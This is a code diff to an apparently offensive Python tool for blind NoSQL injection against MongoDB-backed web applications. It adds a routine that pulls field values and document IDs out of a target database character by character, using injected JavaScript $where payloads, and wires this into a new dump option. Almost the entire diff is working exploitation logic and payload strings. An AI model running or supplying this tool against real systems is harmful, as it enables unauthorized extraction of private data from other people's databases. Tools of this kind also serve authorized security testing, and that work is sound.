@@ -14,7 +14,7 @@ import urllib3
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-ascii_chars='abcdefghijklmnopqrstuvwxyz_0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ!"#$%&'+"'"+'()*+,-./:;<=>?@[\]^`{|}~ '
+ascii_chars='0123456789abcdefghijklmnopqrstuvwxyz_ABCDEFGHIJKLMNOPQRSTUVWXYZ!"#$%&'+"'"+'()*+,-./:;<=>?@[\]^`{|}~ '
 random_str = secrets.token_hex(16)
 timeout_subdomain=hashlib.md5(random_str.encode()).hexdigest()
 
@@ -175,7 +175,7 @@ def blind_get_number_of_keys(target_url, injection_character, blind_string, post
     payload = injection_character + " && Object.keys(this).length == %SIZE_OF_RESULT% && " + injection_character + "1"
     return get_size_of_result(target_url, payload, blind_string, post_data, cookies_dict, connection_timeout) 
 
-def blind_dump_keys(target_url, injection_character, blind_dump_keys, post_data, cookies_dict, connection_timeout):
+def blind_dump_keys(target_url, injection_character, blind_string, post_data, cookies_dict, connection_timeout):
     number_of_keys=blind_get_number_of_keys(target_url, injection_character, blind_string, post_data, cookies_dict, connection_timeout)
     keys_array=[]
     print(f"Number of keys: {number_of_keys}.")
@@ -195,7 +195,53 @@ def blind_dump_keys(target_url, injection_character, blind_dump_keys, post_data,
     dump_ascii_table(keys_array,True)
     return keys_array
 
-def blind_get_db_version(target_url, injection_character, blind_dump_keys, post_data, cookies_dict, connection_timeout):
+def blind_dump_values_for_keys(target_url, injection_character, blind_string, keys_array, post_data, cookies_dict, connection_timeout):
+    values_array=[]
+    keys_array.append("_id")
+    last_id='0'
+    # try to inject the payloads in target_url or post_data
+    try:
+        blind_size_payload = injection_character + ";if (this._id.toString() > '_LAST_ID_' && this._CURRENT_KEY_.toString().length == %SIZE_OF_RESULT%) { return true; } else { return false; };" + injection_character + "1"
+        blind_value_payload = injection_character + ";if (this._id.toString() > '_LAST_ID_' && this._CURRENT_KEY_.toString().charCodeAt(%CHARACTER_NUMBER%) == %CURRENT_CHARACTER%) { return true; } else { return false; };" + injection_character + "1"
+        #blind_id_size_payload = injection_character + ";if (this._id.toString() > '_LAST_ID_' && this._id.toString().replace('ObjectId(\"','').replace('\")','').startsWith('%DUMP_VALUE%') && this._id.toString().replace('ObjectId(\"','').replace('\")','').length == %SIZE_OF_RESULT%) { return true; } else { return false; };" + injection_character + "1"
+        blind_id_size_payload = injection_character + ";if (this._id.toString().replace('ObjectId(\"','').replace('\")','') > '_LAST_ID_' && this._id.toString().replace('ObjectId(\"','').replace('\")','').length == %SIZE_OF_RESULT%) { return true; } else { return false; };" + injection_character + "1"
+        blind_id_value_payload = injection_character + ";if (this._id.toString().replace('ObjectId(\"','').replace('\")','') > '_LAST_ID_' && this._id.toString().replace('ObjectId(\"','').replace('\")','').startsWith('%DUMP_VALUE%') && this._id.toString().replace('ObjectId(\"','').replace('\")','').charCodeAt(%CHARACTER_NUMBER%) == %CURRENT_CHARACTER%) { return true; } else { return false; };" + injection_character + "1"
+        while True:
+            current_values=[]
+            for current_key in keys_array:
+                if current_key == "_id": 
+                    #current_size_payload=blind_size_payload.replace("_CURRENT_KEY_.toString()",current_key+".toString().replace('ObjectId(\"','').replace('\")','')").replace('_LAST_ID_',last_id)
+                    current_size_payload=blind_id_size_payload.replace("_LAST_ID_",last_id)
+                    current_value_size=get_size_of_result(target_url, current_size_payload, blind_string, post_data, cookies_dict, connection_timeout)
+                    print(f"Size of {current_key} string:{current_value_size}")
+                    #current_value_payload=blind_value_payload.replace("_CURRENT_KEY_",current_key+".toString().replace('ObjectId(\"','').replace('\")','')").replace('_LAST_ID_',last_id)
+                    current_value_payload=blind_id_value_payload.replace("_LAST_ID_",last_id)
+                else:
+                    current_size_payload=blind_size_payload.replace("_CURRENT_KEY_",current_key).replace('_LAST_ID_',last_id)
+                    current_value_size=get_size_of_result(target_url, current_size_payload, blind_string, post_data, cookies_dict, connection_timeout)
+                    print(f"Size of {current_key} string:{current_value_size}")
+                    current_value_payload=blind_value_payload.replace("_CURRENT_KEY_",current_key).replace('_LAST_ID_',last_id)
+                current_value_dump_prefix=f"Value of {current_key} string: " 
+                current_value=dump_string_value(target_url, current_value_dump_prefix, current_value_size, current_value_payload, blind_string, post_data, cookies_dict, connection_timeout)
+                print("\n")
+                print(f"{current_key}: {current_value}")
+                if not values_array:
+                    values_array.append(keys_array)
+                if current_key == "_id": 
+                    current_id=current_value.replace('ObjectId("', '').replace('")', '')
+                    last_id=current_id
+                current_values.append(current_value)
+            values_array.append(current_values)
+    except Exception as e:
+        print("unable to perform nosql injection!!!")
+        print("Error: "+str(e))
+        sys.exit(-1)
+
+    print("Data:")
+    dump_ascii_table(values_array,True)
+    return values_array 
+
+def blind_get_db_version(target_url, injection_character, blind_string, post_data, cookies_dict, connection_timeout):
     db_version_size_payload = injection_character + " && version().length == %SIZE_OF_RESULT% && " + injection_character + "1"
     db_version_size=get_size_of_result(target_url, db_version_size_payload, blind_string, post_data, cookies_dict, connection_timeout)
     print(f"Size of db version string:{db_version_size}")
@@ -215,6 +261,7 @@ def dump_string_value(target_url, dump_prefix, dump_size, payload, blind_string,
                 current_char="\'"
             current_payload=payload.replace("%CHARACTER_NUMBER%",str(character_number))
             current_payload=current_payload.replace("%CURRENT_CHARACTER%",str(ord(current_char)))
+            current_payload=current_payload.replace("%DUMP_VALUE%",dump_value)
             injection_result=cypher_inject(target_url, current_payload, post_data, cookies_dict, connection_timeout, blind_string)
             if (blind_string and injection_result and blind_string in injection_result) or not injection_result:
                 dump_value+=current_char
@@ -507,7 +554,14 @@ try:
             error_get_db_version(target_url, error_injection_type, post_data, cookies_dict, connection_timeout)
     elif blind_injection_type:
         if should_dump_keys:
-            keys_array=blind_dump_keys(target_url, blind_injection_type, blind_string, post_data, cookies_dict, connection_timeout)
+            print(f"Dumping keys.\n")
+            blind_dump_keys(target_url, blind_injection_type, blind_string, post_data, cookies_dict, connection_timeout)
+        elif args.dump:
+            if not requested_keys_array:
+                print(f"Dumping keys.\n")
+                requested_keys_array=blind_dump_keys(target_url, blind_injection_type, blind_string, post_data, cookies_dict, connection_timeout)
+            print(f"Dumping values.\n")
+            blind_dump_values_for_keys(target_url, blind_injection_type, blind_string, requested_keys_array, post_data, cookies_dict, connection_timeout)
         elif args.dump_db_version:
             print(f"Dumping database version.\n")
             blind_get_db_version(target_url, blind_injection_type, blind_string, post_data, cookies_dict, connection_timeout)
